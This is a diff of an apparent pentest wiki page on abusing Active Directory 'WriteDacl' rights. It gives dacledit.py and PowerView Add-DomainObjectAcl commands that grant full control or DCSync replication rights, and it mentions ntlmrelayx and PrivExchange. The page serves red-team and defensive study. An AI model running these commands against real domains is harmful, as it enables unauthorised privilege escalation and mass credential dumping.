@@ -1,30 +1,46 @@
 # Grant rights
 
-This abuse can be carried out when controlling an object that has `WriteDacl` over any object.
+This abuse can be carried out when controlling an object that has `WriteDacl` over another object.
 
-The attacker can write a new ACE to the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object. This can be achieved with [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).
+The attacker can write a new ACE to the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object.&#x20;
 
-For instance, this ACE can be abused to grant `GenericAll` rights over the compromised object.
+Instead of giving full control, the same process can be applied to allow an object to [DCSync](../credentials/dumping/dcsync.md) by adding two ACEs with specific Extended Rights (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`). Giving full control leads to the same thingsince `GenericAll` includes all `ExtendedRights`, hence the two extended rights needed for DCSync to work.
+
+Story time, Exchange Servers used to have `WriteDacl` over domain objects, allowing attackers to conduct a [PrivExchange](../exchange-services/privexchange.md) attack where control would be gained over an Exchange Server which would then be used to grant an attacker-controlled object DCSync privileges to the domain.
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+From UNIX-like systems, this can be done with [Impacket](https://github.com/SecureAuthCorp/impacket)'s dacledit.py (Python).
+
+:warning: _At the time of writing, the_ [_Pull Request (#1291)_](https://github.com/SecureAuthCorp/impacket/pull/1291) _is still pending._
 
 ```bash
-Add-DomainObjectAcl -TargetIdentity "target_object" -PrincipalIdentity "controlled_object" -Rights All
+# Give full control
+dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' 'domain'/'user':'password'
+
+# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
+dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' 'domain'/'user':'password'
+```
+
+For a DCSync granting attack, instead of using dacledit, [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) has the ability to operate that abuse with the `--escalate-user` option (see [this](https://medium.com/@arkanoidctf/hackthebox-writeup-forest-4db0de793f96)).
+{% endtab %}
+
+{% tab title="Windows" %}
+From a Windows system, this can be achieved with [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).
+
+```bash
+# Give full control
+Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
+
+# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
+Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
 ```
 
 {% hint style="info" %}
 A few tests showed the `Add-DomainObjectAcl` command needed to be run with the `-Credential` and `-Domain` options in order to work
 {% endhint %}
-
-The same process can be applied to allow an object to [DCSync](../credentials/dumping/dcsync.md) (with `-Rights DCSync`) even though `GenericAll` includes all `ExtendedRights`, hence the two extended rights needed for DCSync to work (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`)
-
-Exchange Servers used to have WriteDacl over domain objects, allowing attackers to conduct a [PrivExchange](../exchange-services/privexchange.md) attack.
-
-For this specific use case, on UNIX-like systems, [dcsync.py](https://github.com/n00py/DCSync) can be used to abuse WriteDacl permission against a domain object to grant DCSync rights and operated the dump.
-
-```bash
-dcsync.py -dc "domaincontroller" -t "target object distinguished name" "domain\user:password"
-```
-
-Alternatively, ntlmrelayx has the ability to operate that abuse with the `--escalate-user` option (see [this](https://medium.com/@arkanoidctf/hackthebox-writeup-forest-4db0de793f96)).
+{% endtab %}
+{% endtabs %}
 
 ## References
 
